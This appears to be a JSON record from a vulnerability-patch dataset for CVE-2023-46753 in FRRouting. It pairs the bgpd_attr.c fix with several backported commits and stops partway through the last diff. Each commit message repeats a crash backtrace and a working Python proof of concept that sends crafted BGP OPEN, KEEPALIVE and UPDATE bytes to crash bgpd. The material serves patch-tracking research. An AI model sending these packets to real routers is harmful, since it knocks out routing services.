{
  "cve_id": "CVE-2023-46753",
  "cve_desc": "An issue was discovered in FRRouting FRR through 9.0.1. A crash can occur for a crafted BGP UPDATE message without mandatory attributes, e.g., one with only an unknown transit attribute.",
  "repo": "FRRouting/frr",
  "patch_hash": "d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
  "patch_info": {
    "commit_hash": "d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
    "repo": "FRRouting/frr",
    "commit_url": "https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9",
    "files": [
      "bgpd/bgp_attr.c"
    ],
    "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
    "before_after_code_files": [
      "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
    ]
  },
  "patch_diff": {
    "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
      "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "3385: }",
      "3389: {",
      "3390:  uint8_t type = 0;",
      "3395:   return BGP_ATTR_PARSE_PROCEED;",
      "",
      "[Removed Lines]",
      "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
      "3394:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
      "",
      "[Added Lines]",
      "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
      "3389:      bgp_size_t length)",
      "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
      "3396:      !length)",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "3443:  enum bgp_attr_parse_ret ret;",
      "3444:  uint8_t flag = 0;",
      "3445:  uint8_t type = 0;",
      "3447:  uint8_t *startp, *endp;",
      "3448:  uint8_t *attr_endp;",
      "3449:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
      "",
      "[Removed Lines]",
      "3446:  bgp_size_t length;",
      "",
      "[Added Lines]",
      "3448:  bgp_size_t length = 0;",
      "",
      "---------------",
      "--- Hunk 3 ---",
      "[Context before]",
      "3831:  }",
      "3835:  if (ret < 0)",
      "3836:   goto done;",
      "",
      "[Removed Lines]",
      "3834:  ret = bgp_attr_check(peer, attr);",
      "",
      "[Added Lines]",
      "3836:  ret = bgp_attr_check(peer, attr, length);",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "21418d64af11553c402f932b0311c812d98ac3e4",
      "candidate_info": {
        "commit_hash": "21418d64af11553c402f932b0311c812d98ac3e4",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/21418d64af11553c402f932b0311c812d98ac3e4",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit d8482bf011cb2b173e85b65b4bf3d5061250cdb9)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3400: }",
          "3404: {",
          "3405:  uint8_t type = 0;",
          "3410:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Removed Lines]",
          "3403: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
          "3409:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "",
          "[Added Lines]",
          "3403: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
          "3404:      bgp_size_t length)",
          "3410:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3411:      !length)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3458:  enum bgp_attr_parse_ret ret;",
          "3459:  uint8_t flag = 0;",
          "3460:  uint8_t type = 0;",
          "3462:  uint8_t *startp, *endp;",
          "3463:  uint8_t *attr_endp;",
          "3464:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
          "",
          "[Removed Lines]",
          "3461:  bgp_size_t length;",
          "",
          "[Added Lines]",
          "3463:  bgp_size_t length = 0;",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "3781:  }",
          "3785:  if (ret < 0)",
          "3786:   goto done;",
          "",
          "[Removed Lines]",
          "3784:  ret = bgp_attr_check(peer, attr);",
          "",
          "[Added Lines]",
          "3786:  ret = bgp_attr_check(peer, attr, length);",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "3cc271a39f0e05b9478413ec6425d4ad0daf0932",
      "candidate_info": {
        "commit_hash": "3cc271a39f0e05b9478413ec6425d4ad0daf0932",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/3cc271a39f0e05b9478413ec6425d4ad0daf0932",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit d8482bf011cb2b173e85b65b4bf3d5061250cdb9)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3106: }",
          "3110: {",
          "3111:  uint8_t type = 0;",
          "3116:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Removed Lines]",
          "3109: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
          "3115:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "",
          "[Added Lines]",
          "3109: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
          "3110:      bgp_size_t length)",
          "3116:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3117:      !length)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3164:  enum bgp_attr_parse_ret ret;",
          "3165:  uint8_t flag = 0;",
          "3166:  uint8_t type = 0;",
          "3168:  uint8_t *startp, *endp;",
          "3169:  uint8_t *attr_endp;",
          "3170:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
          "",
          "[Removed Lines]",
          "3167:  bgp_size_t length;",
          "",
          "[Added Lines]",
          "3169:  bgp_size_t length = 0;",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "3484:  }",
          "3488:  if (ret < 0)",
          "3489:   goto done;",
          "",
          "[Removed Lines]",
          "3487:  ret = bgp_attr_check(peer, attr);",
          "",
          "[Added Lines]",
          "3489:  ret = bgp_attr_check(peer, attr, length);",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "6cca03a52e047f1271807ac501b08b3a4f5ad344",
      "candidate_info": {
        "commit_hash": "6cca03a52e047f1271807ac501b08b3a4f5ad344",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/6cca03a52e047f1271807ac501b08b3a4f5ad344",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit d8482bf011cb2b173e85b65b4bf3d5061250cdb9)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3385: }",
          "3389: {",
          "3390:  uint8_t type = 0;",
          "3395:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Removed Lines]",
          "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
          "3394:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "",
          "[Added Lines]",
          "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
          "3389:      bgp_size_t length)",
          "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3396:      !length)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3443:  enum bgp_attr_parse_ret ret;",
          "3444:  uint8_t flag = 0;",
          "3445:  uint8_t type = 0;",
          "3447:  uint8_t *startp, *endp;",
          "3448:  uint8_t *attr_endp;",
          "3449:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
          "",
          "[Removed Lines]",
          "3446:  bgp_size_t length;",
          "",
          "[Added Lines]",
          "3448:  bgp_size_t length = 0;",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "3831:  }",
          "3835:  if (ret < 0)",
          "3836:   goto done;",
          "",
          "[Removed Lines]",
          "3834:  ret = bgp_attr_check(peer, attr);",
          "",
          "[Added Lines]",
          "3836:  ret = bgp_attr_check(peer, attr, length);",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "77e4046de0c602fcaad249909a99fbc037ac5c6b",
      "candidate_info": {
        "commit_hash": "77e4046de0c602fcaad249909a99fbc037ac5c6b",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/77e4046de0c602fcaad249909a99fbc037ac5c6b",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit d8482bf011cb2b173e85b65b4bf3d5061250cdb9)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
